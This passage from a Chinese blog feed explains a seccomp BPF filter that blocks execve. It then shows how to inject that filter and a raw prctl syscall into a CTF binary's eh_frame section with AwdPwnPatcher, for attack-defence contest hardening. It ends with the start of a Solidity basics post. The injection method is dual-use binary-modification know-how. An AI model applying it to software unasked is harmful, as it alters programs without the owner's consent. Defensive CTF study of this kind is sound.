<p>这是一个 BPF（Berkeley Packet Filter）过滤器指令数组，用来定义程序的过滤规则。每一条 <code>sock_filter</code> 定义了一条 BPF 指令，用来判断并处理系统调用。</p>
<p><strong>第一条指令</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(<span class="keyword">struct</span> seccomp_data, nr))</span><br></pre></td></tr></table></figure></div>
<ul>
<li>这里使用 <code>BPF_LD</code> 加载 <code>seccomp_data</code> 结构体中的 <code>nr</code> 成员（即系统调用号）。</li>
<li><code>BPF_W</code> 表示加载的是一个 32 位的值。</li>
<li><code>BPF_ABS</code> 表示从固定的偏移量读取数据。</li>
<li><code>offsetof(struct seccomp_data, nr)</code> 是 <code>seccomp_data</code> 结构体中 <code>nr</code> 成员的偏移量，<code>nr</code> 是存储系统调用号的字段。</li>
</ul>
<p>这条指令的作用是读取当前正在执行的系统调用号，以便后续判断是否是 <code>execve</code> 系统调用。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seccomp_data</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> nr;        <span class="comment">// 系统调用号</span></span><br><span class="line">    __u32 arch;    <span class="comment">// 架构信息</span></span><br><span class="line">    __u64 instruction_pointer; <span class="comment">// 指令指针</span></span><br><span class="line">    __u64 args[<span class="number">6</span>]; <span class="comment">// 系统调用参数</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p>其中由于linux内核中结构体定义如上，所以实际上offsetof(struct seccomp_data, nr)也可以写为0。</p>
<p><strong>第二条指令</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, <span class="number">59</span>, <span class="number">0</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>BPF_JMP</code> 指令执行跳转。</li>
<li><code>BPF_JEQ</code> 是“跳转如果相等”的操作符，表示如果条件为真则跳转。</li>
<li><code>BPF_K</code> 指定了一个立即数（这里为 59）。</li>
</ul>
<p>这条指令会判断加载的系统调用号是否等于 <code>execve</code> 的系统调用号（59）。如果是，则跳过后面的第一条指令，继续执行杀死进程的语句；否则跳过后面的两条指令，直接允许执行系统调用。</p>
<p><strong>第三条指令</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL)</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>BPF_RET</code> 表示返回结果。</li>
<li><code>BPF_K</code> 表示一个立即数操作，这里为 <code>SECCOMP_RET_KILL</code>，这是 seccomp 的一个特定返回值，表示当遇到 <code>execve</code> 系统调用时杀死进程。</li>
</ul>
<p>这条指令表示如果系统调用号是 <code>execve</code>，则终止进程。</p>
<p><strong>第四条指令</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW)</span><br></pre></td></tr></table></figure></div>
<ul>
<li>这条指令会返回 <code>SECCOMP_RET_ALLOW</code>，表示允许其他系统调用正常执行。</li>
</ul>
<h4 id="struct-sock-fprog-prog"><a href="#struct-sock-fprog-prog" class="headerlink" title="struct sock_fprog prog"></a><strong>struct sock_fprog prog</strong></h4><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">prog</span> =</span> &#123;</span><br><span class="line">    .len = <span class="keyword">sizeof</span>(filter) / <span class="keyword">sizeof</span>(filter[<span class="number">0</span>]),</span><br><span class="line">    .filter = filter</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>struct sock_fprog</code> 是一个包含 seccomp 过滤器程序的结构体：<ul>
<li><code>len</code> 表示 <code>filter</code> 数组的长度（指令数量）。通过 <code>sizeof(filter) / sizeof(filter[0])</code> 来计算过滤器中有多少条指令。</li>
<li><code>filter</code> 是一个指向 <code>sock_filter</code> 数组的指针，用于存储 seccomp 过滤器的指令集。</li>
</ul>
</li>
</ul>
<p>该结构体用于将 BPF 过滤器指令加载到内核中。</p>
<h4 id="prctl-系统调用"><a href="#prctl-系统调用" class="headerlink" title="prctl 系统调用"></a><strong>prctl 系统调用</strong></h4><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog) != <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;prctl&quot;</span>);</span><br><span class="line">    _exit(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>prctl</code> 是用来对进程的某些属性进行设置的系统调用。</li>
<li><code>PR_SET_SECCOMP</code> 是用于启用 seccomp 的选项。</li>
<li><code>SECCOMP_MODE_FILTER</code> 表示以过滤模式运行 seccomp，意味着我们会使用 BPF 过滤器来决定哪些系统调用可以执行，哪些会被拒绝。</li>
<li><code>&amp;prog</code> 是指向我们定义的过滤器程序的指针，它告诉内核使用这个过滤器来限制系统调用。</li>
</ul>
<p>如果 <code>prctl</code> 调用失败，意味着 seccomp 设置失败，会输出错误信息并终止进程。</p>
<p>这里其实也可以把SECCOMP_MODE_FILTER改成 SECCOMP_MODE_STRICT  ，然后就不用构建并传prog了，这样一来会仅仅允许exit，sigreturn，read以及write的系统调用。</p>
<p>其中BPF_STMT与BPF_JUMP实际上是一个宏定义，是条件编译后赋值的sock_filter结构体，这就是为什么<code>struct sock_filter filter[]</code>这个声明是声明结构体数组。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span>     BPF_STMT</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    BPF_STMT(code,k)&#123;(unsigned short)(code),0,0,k&#125;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span>     BPF_JUMP</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    BPF_JUMP(code,k,jt,jf)&#123;(unsigned short)(code),jt,jf,k&#125;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>
<p>而sock_filter的结构体定义如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> &#123;</span></span><br><span class="line">    __u16   code;   <span class="comment">/* BPF opcode */</span></span><br><span class="line">    __u8    jt;     <span class="comment">/* Jump true */</span></span><br><span class="line">    __u8    jf;     <span class="comment">/* Jump false */</span></span><br><span class="line">    __u32   k;      <span class="comment">/* Generic multiuse field */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<h4 id="其他一些常用的宏定义"><a href="#其他一些常用的宏定义" class="headerlink" title="其他一些常用的宏定义"></a>其他一些常用的宏定义</h4><p>基本都是位掩码，只需要知道其代表的含义即可。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 主指令类别（2 位）</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_LD          0x00  <span class="comment">// Load</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_LDX         0x01  <span class="comment">// Load with index</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_ST          0x02  <span class="comment">// Store</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_STX         0x03  <span class="comment">// Store with index</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_ALU         0x04  <span class="comment">// ALU (arithmetic logic unit) operation</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_JMP         0x05  <span class="comment">// Jump</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_RET         0x06  <span class="comment">// Return</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_MISC        0x07  <span class="comment">// Miscellaneous</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 操作码的大小（3 位）</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_W           0x00  <span class="comment">// Word (32-bit)</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_H           0x08  <span class="comment">// Half-word (16-bit)</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_B           0x10  <span class="comment">// Byte (8-bit)</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 加载/存储操作的模式（3 位）</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_IMM         0x00  <span class="comment">// Immediate value</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_ABS         0x20  <span class="comment">// Absolute</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_IND         0x40  <span class="comment">// Indirect</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_MEM         0x60  <span class="comment">// Memory</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_LEN         0x80  <span class="comment">// Packet length</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_MSH         0xA0  <span class="comment">// Modulo shift</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 计算和比较操作的源（1 位）</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_K           0x00  <span class="comment">// Constant</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_X           0x08  <span class="comment">// Register</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ALU 运算符（4 位）</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_ADD         0x00  <span class="comment">// Addition</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_SUB         0x10  <span class="comment">// Subtraction</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_MUL         0x20  <span class="comment">// Multiplication</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_DIV         0x30  <span class="comment">// Division</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_OR          0x40  <span class="comment">// Bitwise OR</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_AND         0x50  <span class="comment">// Bitwise AND</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_LSH         0x60  <span class="comment">// Left shift</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_RSH         0x70  <span class="comment">// Right shift</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_NEG         0x80  <span class="comment">// Negation</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_MOD         0x90  <span class="comment">// Modulo</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_XOR         0xA0  <span class="comment">// Bitwise XOR</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 跳转条件（4 位）</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_JA          0x00  <span class="comment">// Jump unconditionally</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_JEQ         0x10  <span class="comment">// Jump if equal</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_JGT         0x20  <span class="comment">// Jump if greater than</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_JGE         0x30  <span class="comment">// Jump if greater or equal</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_JSET        0x40  <span class="comment">// Jump if bits are set</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Return 操作码</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_RET         0x06  <span class="comment">// Return</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_RET_KILL 0x00000000  <span class="comment">// Kill process</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_RET_ALLOW 0x7fff0000 <span class="comment">// Allow syscall</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//对seccomp mode 进行操作</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_GET_SECCOMP      21</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_SET_SECCOMP     22</span></span><br></pre></td></tr></table></figure></div>
<h3 id="二、调试获取汇编写法"><a href="#二、调试获取汇编写法" class="headerlink" title="二、调试获取汇编写法"></a>二、调试获取汇编写法</h3><p>查看pwndbg，install_seccomp()函数的主逻辑如下，我们可以发现除了prctl系统调用外，前面的一系列结构体的初始化都没有调用函数，而且这一大通操作实际上很多是一个一个字节进行的修改，那么我们在eh_frame空间有限的情况下，实际可以通过8字节直接赋值参数来节省掉许多指令字节。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x5555555551e4 &lt;install_seccomp+27&gt;    mov    word ptr [rbp - 0x30], 0x20     [0x7fffffffe450] =&gt; 0x20</span><br><span class="line">0x5555555551ea &lt;install_seccomp+33&gt;    mov    byte ptr [rbp - 0x2e], 0        [0x7fffffffe452] =&gt; 0</span><br><span class="line">0x5555555551ee &lt;install_seccomp+37&gt;    mov    byte ptr [rbp - 0x2d], 0        [0x7fffffffe453] =&gt; 0</span><br><span class="line">0x5555555551f2 &lt;install_seccomp+41&gt;    mov    dword ptr [rbp - 0x2c], 0       [0x7fffffffe454] =&gt; 0</span><br><span class="line">0x5555555551f9 &lt;install_seccomp+48&gt;    mov    word ptr [rbp - 0x28], 0x15     [0x7fffffffe458] =&gt; 0x15</span><br><span class="line">0x5555555551ff &lt;install_seccomp+54&gt;    mov    byte ptr [rbp - 0x26], 0        [0x7fffffffe45a] =&gt; 0</span><br><span class="line">0x555555555203 &lt;install_seccomp+58&gt;     mov    byte ptr [rbp - 0x25], 1               [0x7fffffffe45b] =&gt; 1</span><br><span class="line">0x555555555207 &lt;install_seccomp+62&gt;     mov    dword ptr [rbp - 0x24], 0x3b           [0x7fffffffe45c] =&gt; 0x3b</span><br><span class="line">0x55555555520e &lt;install_seccomp+69&gt;     mov    word ptr [rbp - 0x20], 6               [0x7fffffffe460] =&gt; 6</span><br><span class="line">0x555555555214 &lt;install_seccomp+75&gt;     mov    byte ptr [rbp - 0x1e], 0               [0x7fffffffe462] =&gt; 0</span><br><span class="line">0x555555555218 &lt;install_seccomp+79&gt;     mov    byte ptr [rbp - 0x1d], 0               [0x7fffffffe463] =&gt; 0</span><br><span class="line">0x55555555521c &lt;install_seccomp+83&gt;     mov    dword ptr [rbp - 0x1c], 0              [0x7fffffffe464] =&gt; 0</span><br><span class="line">0x555555555223 &lt;install_seccomp+90&gt;     mov    word ptr [rbp - 0x18], 6               [0x7fffffffe468] =&gt; 6</span><br><span class="line">0x555555555229 &lt;install_seccomp+96&gt;     mov    byte ptr [rbp - 0x16], 0               [0x7fffffffe46a] =&gt; 0</span><br><span class="line">0x55555555522d &lt;install_seccomp+100&gt;    mov    byte ptr [rbp - 0x15], 0               [0x7fffffffe46b] =&gt; 0</span><br><span class="line">0x555555555231 &lt;install_seccomp+104&gt;    mov    dword ptr [rbp - 0x14], 0x7fff0000     [0x7fffffffe46c] =&gt; 0x7fff0000</span><br><span class="line">0x555555555238 &lt;install_seccomp+111&gt;    mov    word ptr [rbp - 0x40], 4               [0x7fffffffe440] =&gt; 4</span><br><span class="line">0x55555555523e &lt;install_seccomp+117&gt;    lea    rax, [rbp - 0x30]                      RAX =&gt; 0x7fffffffe450 ◂— 0x20 /* &#x27; &#x27; */</span><br><span class="line">0x555555555242 &lt;install_seccomp+121&gt;    mov    qword ptr [rbp - 0x38], rax            [0x7fffffffe448] =&gt; 0x7fffffffe450 ◂— 0x20 /* &#x27; &#x27; */</span><br><span class="line">0x555555555246 &lt;install_seccomp+125&gt;    lea    rax, [rbp - 0x40]                      RAX =&gt; 0x7fffffffe440 ◂— 4</span><br><span class="line">0x55555555524a &lt;install_seccomp+129&gt;    mov    rdx, rax                               RDX =&gt; 0x7fffffffe440 ◂— 4</span><br><span class="line">0x55555555524d &lt;install_seccomp+132&gt;    mov    esi, 2                                 ESI =&gt; 2</span><br><span class="line">0x555555555252 &lt;install_seccomp+137&gt;    mov    edi, 0x16                              EDI =&gt; 0x16</span><br><span class="line">0x555555555257 &lt;install_seccomp+142&gt;    mov    eax, 0                                 EAX =&gt; 0</span><br><span class="line">0x55555555525c &lt;install_seccomp+147&gt;    call   prctl@plt                   			  &lt;prctl@plt&gt;</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/self-made-sandbox/image-20240921151136186.png"
                      class=""
                >
<p>最后整个prog结构体的地址是存在rdx中，也就是rbp - 0x40这个地址处。但之后遇到了问题，在prctl函数的实现中，在prctl的系统调用时始终不成功，返回的rax代表的错误码。之后尝试直接执行test，发现是权限问题。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/self-made-sandbox/image-20240921151151584.png"
                      class=""
                >
<p>这下尴尬了，本来想上沙箱是为了方便防御，这么一来二去搞awd前还得提权，更加麻烦了，这下就只能算是学习沙箱实现的机制了。那么我们得切到root用户进行调试（本来想setuid改文件，但好像wsl不支持），进到prctl具体实现里看看。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x7ffff7eae338</span> &lt;prctl+<span class="number">8</span>&gt;        mov    r10, rcx                        R10 =&gt; <span class="number">0x555555557da0</span> (__do_global_dtors_aux_fini_array_entry) —▸ <span class="number">0x555555555180</span> (__do_global_dtors_aux) ◂— endbr64</span><br><span class="line"><span class="number">0x7ffff7eae33b</span> &lt;prctl+<span class="number">11</span>&gt;       mov    qword ptr [rsp + <span class="number">0x28</span>], rsi     [<span class="number">0x7fffffffe408</span>] =&gt; <span class="number">2</span></span><br><span class="line"><span class="number">0x7ffff7eae340</span> &lt;prctl+<span class="number">16</span>&gt;       mov    qword ptr [rsp + <span class="number">0x30</span>], rdx     [<span class="number">0x7fffffffe410</span>] =&gt; <span class="number">0x7fffffffe440</span> ◂— <span class="number">4</span></span><br><span class="line"><span class="number">0x7ffff7eae345</span> &lt;prctl+<span class="number">21</span>&gt;       mov    qword ptr [rsp + <span class="number">0x38</span>], rcx     [<span class="number">0x7fffffffe418</span>] =&gt; <span class="number">0x555555557da0</span> (__do_global_dtors_aux_fini_array_entry) —▸ <span class="number">0x555555555180</span> (__do_global_dtors_aux) ◂— endbr64</span><br><span class="line"><span class="number">0x7ffff7eae34a</span> &lt;prctl+<span class="number">26</span>&gt;       mov    qword ptr [rsp + <span class="number">0x40</span>], r8      [<span class="number">0x7fffffffe420</span>] =&gt; <span class="number">0x7ffff7fa3f10</span> (initial+<span class="number">16</span>) ◂— <span class="number">4</span></span><br><span class="line"><span class="number">0x7ffff7eae34f</span> &lt;prctl+<span class="number">31</span>&gt;       mov    rax, qword ptr fs:[<span class="number">0x28</span>]        RAX, [<span class="number">0x7ffff7d85768</span>] =&gt; <span class="number">0xc68810ecdaf50d00</span></span><br><span class="line"><span class="number">0x7ffff7eae358</span> &lt;prctl+<span class="number">40</span>&gt;       mov    qword ptr [rsp + <span class="number">0x18</span>], rax     [<span class="number">0x7fffffffe3f8</span>] =&gt; <span class="number">0xc68810ecdaf50d00</span></span><br><span class="line"><span class="number">0x7ffff7eae35d</span> &lt;prctl+<span class="number">45</span>&gt;    xor    eax, eax                        EAX =&gt; <span class="number">0</span></span><br><span class="line"><span class="number">0x7ffff7eae35f</span> &lt;prctl+<span class="number">47</span>&gt;    lea    rax, [rsp + <span class="number">0x60</span>]               RAX =&gt; <span class="number">0x7fffffffe440</span> ◂— <span class="number">4</span></span><br><span class="line"><span class="number">0x7ffff7eae364</span> &lt;prctl+<span class="number">52</span>&gt;    mov    dword ptr [rsp], <span class="number">8</span>              [<span class="number">0x7fffffffe3e0</span>] =&gt; <span class="number">8</span></span><br><span class="line"><span class="number">0x7ffff7eae36b</span> &lt;prctl+<span class="number">59</span>&gt;    mov    qword ptr [rsp + <span class="number">8</span>], rax        [<span class="number">0x7fffffffe3e8</span>] =&gt; <span class="number">0x7fffffffe440</span> ◂— <span class="number">4</span></span><br><span class="line"><span class="number">0x7ffff7eae370</span> &lt;prctl+<span class="number">64</span>&gt;    lea    rax, [rsp + <span class="number">0x20</span>]               RAX =&gt; <span class="number">0x7fffffffe400</span> ◂— <span class="number">0</span></span><br><span class="line"><span class="number">0x7ffff7eae375</span> &lt;prctl+<span class="number">69</span>&gt;    mov    qword ptr [rsp + <span class="number">0x10</span>], rax     [<span class="number">0x7fffffffe3f0</span>] =&gt; <span class="number">0x7fffffffe400</span> ◂— <span class="number">0</span></span><br><span class="line"><span class="number">0x7ffff7eae37a</span> &lt;prctl+<span class="number">74</span>&gt;    mov    eax, <span class="number">0x9d</span>                       EAX =&gt; <span class="number">0x9d</span></span><br><span class="line"><span class="number">0x7ffff7eae37f</span> &lt;prctl+<span class="number">79</span>&gt;    syscall  &lt;SYS_prctl&gt;</span><br></pre></td></tr></table></figure></div>
<p>最后syscall时rdi为0x16，rsi为2，rdx为0x7fffffffe440（prog结构体地址），前面的操作用处不大，就是把寄存器参数加载到了栈上以及存了下canary。r10用rcx赋值，r8不变。那么我们只要把那个结构体伪造出来，就可以直接syscall来禁用一些系统调用。理论可行，开始手搓。</p>
<p>我们可以拿一道简单的栈溢出来试一下，更改程序我用的是 <a class="link"   href="https://github.com/aftern00n/AwdPwnPatcher" >https://github.com/aftern00n/AwdPwnPatcher<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 这个库，我们可以把call init patch成一个跳转到ehframe段执行，再在ehframe段最后手动加上call init。AwdPwnPatcher中有个add_constant_in_ehframe方法，其中会将传入的字符串转换为字节字符串。我感觉还是直接在传参前用p64伪造好结构体的各字段比较方便，所以就把库里面字符串的encode逻辑给注释掉了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/self-made-sandbox/image-20240921151211381.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/self-made-sandbox/image-20240921151222496.png"
                      class=""
                >
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> AwdPwnPatcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">awd_pwn_patcher = AwdPwnPatcher(binary)</span><br><span class="line">sock_filter = p64(<span class="number">0x20</span>) + p64(<span class="number">0x3b01000015</span>) + p64(<span class="number">6</span>) + p64(<span class="number">0x7fff000000000006</span>)</span><br><span class="line">sock_filter_addr = awd_pwn_patcher.add_constant_in_ehframe(sock_filter)</span><br><span class="line"></span><br><span class="line">prog = p64(<span class="number">4</span>) + p64(sock_filter_addr)</span><br><span class="line">prog_addr = awd_pwn_patcher.add_constant_in_ehframe(prog)</span><br><span class="line"></span><br><span class="line">assembly = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rax,157</span></span><br><span class="line"><span class="string">    mov rdi,22</span></span><br><span class="line"><span class="string">    mov rsi,2</span></span><br><span class="line"><span class="string">    lea rdx,[<span class="subst">&#123;prog_addr&#125;</span>]</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    call 0x40117A</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">awd_pwn_patcher.patch_by_jmp(jmp_from=<span class="number">0x4011F0</span>,jmp_to=<span class="number">0x4011F5</span>,assembly=assembly)</span><br><span class="line">awd_pwn_patcher.save()</span><br></pre></td></tr></table></figure></div>
<p>这时候本来充满期待开始调试二进制程序，但是首先遇到的问题是ehframe段不可执行，一般来说awd_pwn_patcher.save()时会自动把这个段设为可执行，但这里不知道出了什么问题，得自己手动来。根据<a class="link"   href="https://blog.csdn.net/qq_46106285/article/details/124972056" >https://blog.csdn.net/qq_46106285/article/details/124972056<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 这篇博客能够成功地设置段权限。第二个问题是我在root用户下安装pwntools后，发现会让正常用户gdb调试时出现问题，这个问题的解决方案是起一个python的虚拟环境给root用，或者是<code>sudo pip install --user pwntools</code>来指定只给root用户安装python库。之后运行就不会出现问题了。</p>
<p>运行没有patch过的程序：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/self-made-sandbox/image-20240921151236768.png"
                      class=""
                >
<p>经过patch之后：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/self-made-sandbox/image-20240921151247626.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/self-made-sandbox/image-20240921151256919.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/self-made-sandbox/image-20240921151305738.png"
                      class=""
                >
<p>经过计算，构造禁用execve沙箱所用的仅有0x53字节，一般而言ehframe段还是够用的，每个多加的规则也只会多出8字节的开销，改一下结构体的参数就行。但由于前提是要有root权限执行程序，也是挺鸡肋的。</p>
<h3 id="三、自动化工具"><a href="#三、自动化工具" class="headerlink" title="三、自动化工具"></a>三、自动化工具</h3><p>感觉这个挺有意思的，感觉逻辑也挺简单，上头了小写一手自动化工具（虽然没有什么卵用）</p>
<p>效果图：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/self-made-sandbox/image-20240921151317438.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/self-made-sandbox/image-20240921151328087.png"
                      class=""
                >
<p><a class="link"   href="https://github.com/collectcrop/SandboxAttacher" >https://github.com/collectcrop/SandboxAttacher<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>sandbox</tag>
      </tags>
  </entry>
  <entry>
    <title>solidity&amp;blockchain初探</title>
    <url>/blog/2024/10/08/solidity-blockchain%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<p>solidity这个语言广泛运用与智能合约的编写，想要入门区块链就得先了解这个语言。该语言其实与c语言用法类似。在solidity语言中，标识执行账户是用地址实现的，比如我们MetaMask中创建的Account的地址或是某个合约的地址。</p>
<h3 id="1-一些基本概念与工具站"><a href="#1-一些基本概念与工具站" class="headerlink" title="1.一些基本概念与工具站"></a>1.一些基本概念与工具站</h3><h4 id="1）账户"><a href="#1）账户" class="headerlink" title="1）账户"></a>1）账户</h4><p><strong>外部账户</strong></p>
<p>外部账户是由人创建的，可以存储以太币，是由公钥和私钥控制的账户。每个外部账户拥有一对公私钥，这对密钥用于签署交易，它的地址由公钥决定。外部账户不能包含以太坊虚拟机（EVM）代码。</p>
<p>一个外部账户具有以下特性</p>
<ul>
<li>拥有一定的 Ether</li>
<li>可以发送交易、通过私钥控制</li>
<li>没有相关联的代码</li>
</ul>
<p><strong>合约账户</strong> </p>
<p>合约账户是由外部账户创建的账户，包含合约代码。合约账户的地址是由合约创建时合约创建者的地址，以及该地址发出的交易共同计算得出的。</p>
<p>一个合约账户具有以下特性</p>
<ul>
<li>拥有一定的 Ether</li>
<li>有相关联的代码，代码通过交易或者其他合约发送的调用来激活</li>
<li>当合约被执行时，只能操作合约账户拥有的特定存储</li>
</ul>
<h4 id="2）合约"><a href="#2）合约" class="headerlink" title="2）合约"></a>2）合约</h4><p>在区块链和智能合约的上下文中，合约通常是指一种程序或协议，能够在区块链上自动执行、控制或文档化法律事件和行动。以下是合约的一些关键特征：</p>
<ol>
<li><strong>智能合约</strong>：智能合约是一种自执行的合约，其中协议的条款以代码形式写入，运行在区块链上。它们能够自动执行合约条款，减少对中介的依赖。</li>
<li><strong>去中心化</strong>：合约在区块链上运行，没有单一控制点，这使得合约更加透明和安全。</li>
<li><strong>不可篡改性</strong>：一旦合约部署到区块链上，其内容就无法更改，这提供了强有力的防篡改保障。</li>
<li><strong>透明性</strong>：合约的代码和执行是公开的，任何人都可以查看，从而提高了信任度。</li>
<li><strong>自动执行</strong>：合约可以根据预设条件自动执行，省去人工干预的需要。例如，当某个条件被满足时，合约会自动转移资产。</li>
<li><strong>多种用途</strong>：合约可以用于多种场景，如金融交易、身份验证、供应链管理、投票系统等。</li>
</ol>
<h4 id="3）常用网站及插件"><a href="#3）常用网站及插件" class="headerlink" title="3）常用网站及插件"></a>3）常用网站及插件</h4><ul>
<li>MetaMask插件：可以创建属于自己的以太网账户，拥有一个地址，其相当于一个钱包，存着你不同网络中的以太币。</li>
